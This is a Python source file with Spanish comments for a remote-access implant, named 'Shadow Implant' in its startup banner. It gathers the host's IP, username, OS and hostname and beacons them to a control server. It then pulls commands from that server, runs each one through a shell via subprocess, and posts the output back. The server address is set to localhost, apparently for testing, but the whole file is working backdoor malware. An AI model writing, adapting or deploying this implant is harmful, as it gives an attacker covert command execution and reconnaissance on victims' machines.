import requests
import time
import platform
import socket
import getpass
import uuid
import subprocess # <--- Necesario para ejecutar comandos

SERVER_URL = "http://127.0.0.1:8000" 
SLEEP_TIME = 3 # Más rápido para pruebas
AGENT_ID = str(uuid.uuid4())

def get_system_info():
    try:
        return {
            "id": AGENT_ID,
            "ip": socket.gethostbyname(socket.gethostname()),
            "username": getpass.getuser(),
            "os": f"{platform.system()} {platform.release()}",
            "hostname": socket.gethostname()
        }
    except:
        return {"id": AGENT_ID, "error": "unknown"}

def execute_command(cmd):
    """Ejecuta un comando en la terminal oculta y captura la salida"""
    try:
        # subprocess.check_output ejecuta y nos devuelve el texto
        # shell=True permite usar comandos como 'dir' o 'cd'
        output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
        return output.decode('latin-1') # latin-1 para evitar errores con tildes en Windows
    except subprocess.CalledProcessError as e:
        return f"Error ejecutando comando: {e.output.decode('latin-1')}"
    except Exception as e:
        return f"Error crítico: {str(e)}"

def beacon():
    data = get_system_info()
    
    try:
        # 1. Enviar Beacon
        response = requests.post(f"{SERVER_URL}/beacon", json=data)
        orders = response.json()

        # 2. Verificar si hay órdenes
        if orders.get("action") == "execute":
            for cmd in orders.get("commands", []):
                print(f"⚙️ Ejecutando orden remota: {cmd}")
                
                # Ejecutar
                result_text = execute_command(cmd)
                
                # 3. Enviar resultados de vuelta
                result_data = {
                    "id": AGENT_ID,
                    "command": cmd,
                    "output": result_text
                }
                requests.post(f"{SERVER_URL}/results", json=result_data)

        else:
            print(f"💤 Nada nuevo. Durmiendo {SLEEP_TIME}s...")

    except Exception as e:
        print(f"❌ Error de conexión: {e}")

def main():
    print(f"[*] Shadow Implant Activo. ID: {AGENT_ID}")
    while True:
        beacon()
        time.sleep(SLEEP_TIME)

if __name__ == "__main__":
    main()